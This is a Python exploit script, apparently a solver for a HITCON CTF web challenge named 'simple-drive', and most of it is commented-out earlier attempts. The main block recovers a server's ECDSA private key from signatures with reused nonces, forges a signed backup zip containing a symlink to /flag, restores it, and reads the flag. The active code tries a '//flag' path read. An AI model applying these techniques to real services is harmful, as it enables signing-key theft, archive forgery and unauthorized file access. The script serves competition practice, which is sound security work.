# # import requests
# # import os
# # import uuid
# # import time
# # import binascii
# # import zipfile
# # from io import BytesIO

# # CURVE_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
# # G = (0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798, 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8)

# # from secp256k1 import multiply, add

# # BASE_URL = 'http://simple-drive.chal.hitconctf.com:54619'
# # USERNAME = 'testuser'
# # PASSWORD = 'testpassword'

# # def recover_private_key(r, s1, z1, s2, z2):
# #     """
# #     Recovers the private key using two signatures with a reused nonce.
# #     s1 = k^-1 * (z1 + r * d)
# #     s2 = k^-1 * (z2 + r * d)
# #     """
# #     s_inv = pow(s1 - s2, -1, CURVE_ORDER)
# #     k = ((z1 - z2) * s_inv) % CURVE_ORDER
    
# #     r_inv = pow(r, -1, CURVE_ORDER)
# #     d = ((s1 * k - z1) * r_inv) % CURVE_ORDER
    
# #     return d

# # def main():
# #     s = requests.Session()

# #     print(f"[*] Registering user: {USERNAME}")
# #     s.post(f"{BASE_URL}/register", data={'username': USERNAME, 'password': PASSWORD})
# #     print()

# #     print(f"[*] Logging in as user: {USERNAME}")
# #     r = s.post(f"{BASE_URL}/login", data={'username': USERNAME, 'password': PASSWORD})
# #     while r.status_code != 200:
# #         r = s.post(f"{BASE_URL}/login", data={'username': USERNAME, 'password': PASSWORD})

# #     print("[*] Uploading a dummy file to create backups from...")
# #     s.post(f"{BASE_URL}/upload?path=file.txt", data="this is some dummy data")

# #     # --- Phase 1: Recover the Server's Private Key ---
# #     print("\n--- Phase 1: Recovering Private Key ---")
# #     print("[*] Requesting backups to find a nonce reuse collision...")
    
# #     signatures = {}
# #     found_collision = False
# #     private_key = None

# #     for i in range(150): # Request up to 150 backups
# #         print(f"\r[*] Backup request count: {i+1}", end="")
# #         try:
# #             r_backup = s.get(f"{BASE_URL}/backup")
# #             if r_backup.status_code != 200:
# #                 continue
            
# #             archive = r_backup.content
# #             # The signature (r, s) is the last 64 bytes
# #             sig = archive[-64:]
# #             r_val = int.from_bytes(sig[:32], 'big')
# #             s_val = int.from_bytes(sig[32:], 'big')

# #             if r_val in signatures:
# #                 print(f"\n[+] Collision found for r = {r_val}!")
                
# #                 # We found a collision. Now get the hashes (z values) for both archives.
# #                 archive1 = signatures[r_val]['archive']
# #                 archive2 = archive
                
# #                 r_hash1 = s.post(f"{BASE_URL}/hash", data=archive1)
# #                 r_hash2 = s.post(f"{BASE_URL}/hash", data=archive2)

# #                 z1 = int(r_hash1.text)
# #                 z2 = int(r_hash2.text)
                
# #                 s1 = signatures[r_val]['s']
# #                 s2 = s_val

# #                 private_key = recover_private_key(r_val, s1, z1, s2, z2)
# #                 print(f"[+] Server's private key recovered: {hex(private_key)}")
# #                 found_collision = True
# #                 break
# #             else:
# #                 signatures[r_val] = {'s': s_val, 'archive': archive}

# #         except requests.exceptions.RequestException as e:
# #             print(f"\n[!] An error occurred: {e}")
# #             time.sleep(1)

# #     if not found_collision:
# #         print("\n[!] Failed to find a nonce collision. Try running the script again.")
# #         return

# #     # --- Phase 2: Forge a Signed Archive ---
# #     print("\n--- Phase 2: Forging a Malicious Archive ---")

# #     print("[*] Creating a malicious zip file with a symlink to /flag...")
# #     zip_buffer = BytesIO()
# #     with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
# #         # Create a ZipInfo object for the symlink
# #         link_info = zipfile.ZipInfo('flag_contents')
# #         link_info.create_system = 3  # Unix-like system
# #         # Set the file attribute for a symbolic link
# #         # 0o120000 is the file mode for a symlink (S_IFLNK)
# #         link_info.external_attr = 0o120000 << 16
# #         zf.writestr(link_info, '/flag')
    
# #     malicious_zip_data = zip_buffer.getvalue()
# #     print("[+] Malicious zip created.")

# #     # Get the user ID from a previously obtained valid archive
# #     any_archive = list(signatures.values())[0]['archive']
# #     uid_bytes = any_archive[28:44]
    
# #     # Construct the archive header
# #     SIGNATURE = 0xa075c93f
# #     archive_id = uuid.uuid4().bytes
# #     timestamp = time.time()
# #     crc = binascii.crc32(malicious_zip_data)
    
# #     header = SIGNATURE.to_bytes(4, 'little') + archive_id + \
# #              timestamp.to_bytes(8, 'little', signed=False) + uid_bytes + \
# #              crc.to_bytes(4, 'little', signed=False)

# #     salt = os.urandom(16)
# #     message_to_sign = salt + header + malicious_zip_data
    
# #     # Hash the message to get z
# #     from hashlib import sha256
# #     z = int.from_bytes(sha256(message_to_sign).digest(), 'big')

# #     print("[*] Signing the malicious archive with the recovered private key...")
# #     # Sign using the recovered key 'd' (private_key)
# #     k = secrets.randbelow(CURVE_ORDER) # Use a secure random nonce
# #     r_point = multiply(G, k)
# #     r = r_point[0] % CURVE_ORDER
# #     s = (pow(k, -1, CURVE_ORDER) * (z + r * private_key)) % CURVE_ORDER
    
# #     footer = r.to_bytes(32, 'big') + s.to_bytes(32, 'big')
# #     forged_archive = header + malicious_zip_data + footer
# #     print("[+] Forged archive created and signed successfully.")

# #     # --- Phase 3: Get the Flag ---
# #     print("\n--- Phase 3: Restoring Archive and Getting the Flag ---")

# #     print("[*] Restoring the forged archive to the server...")
# #     r_restore = s.post(f"{BASE_URL}/restore", data=forged_archive)
# #     if r_restore.status_code == 200:
# #         print("[+] Restore successful. The symlink should now be on the server.")
# #     else:
# #         print(f"[!] Restore failed with status code {r_restore.status_code}.")
# #         return

# #     print("[*] Reading the flag via the symbolic link...")
# #     r_flag = s.get(f"{BASE_URL}/read?path=flag_contents")
# #     if r_flag.status_code == 200:
# #         print("\n" + "="*50)
# #         print("      🏁 FLAG FOUND! 🏁")
# #         print("="*50)
# #         print(r_flag.text)
# #         print("="*50)
# #     else:
# #         print(f"[!] Failed to read the flag. Status code: {r_flag.status_code}")


# # if __name__ == '__main__':
# #     # We need a secure random source for our own signing operation
# #     import secrets
# #     main()

# import requests

# BASE_URL = 'http://simple-drive.chal.hitconctf.com:54619'
# USERNAME = 'testuser'
# PASSWORD = 'testpassword'

# s = requests.Session()
# s.post(f"{BASE_URL}/register", data={'username': USERNAME, 'password': PASSWORD})
# r = s.post(f"{BASE_URL}/login", data={'username': USERNAME, 'password': PASSWORD})
# while r.status_code != 200:
#     r = s.post(f"{BASE_URL}/login", data={'username': USERNAME, 'password': PASSWORD})

# print(r.headers)

# x = s.get(f"{BASE_URL}/read?path=//flag", cookies=r.cookies)
# print(x)

import requests

BASE_URL = "http://simple-drive.chal.hitconctf.com:54619"
USERNAME = "testuser"
PASSWORD = "testpass"

def register():
    r = requests.post(
        f"{BASE_URL}/register",
        data={"username": USERNAME, "password": PASSWORD},
    )
    print("Register:", r.status_code)

def login():
    r = requests.post(
        f"{BASE_URL}/login",
        data={"username": USERNAME, "password": PASSWORD},
    )
    print("Login:", r.status_code)
    if r.status_code == 200 and "Set-Cookie" in r.headers:
        cookies = r.cookies.get_dict()
        print("Cookies:", cookies)
        return cookies
    return None

def read_file(cookies, path):
    r = requests.get(f"{BASE_URL}/read", params={"path": path}, cookies=cookies)
    print("Read:", r.status_code)
    if r.status_code == 200:
        print("File contents:\n", r.content.decode(errors="ignore"))
    else:
        print("Failed to read file")

if __name__ == "__main__":
    register()
    cookies = login()
    if cookies:
        read_file(cookies, "//flag")
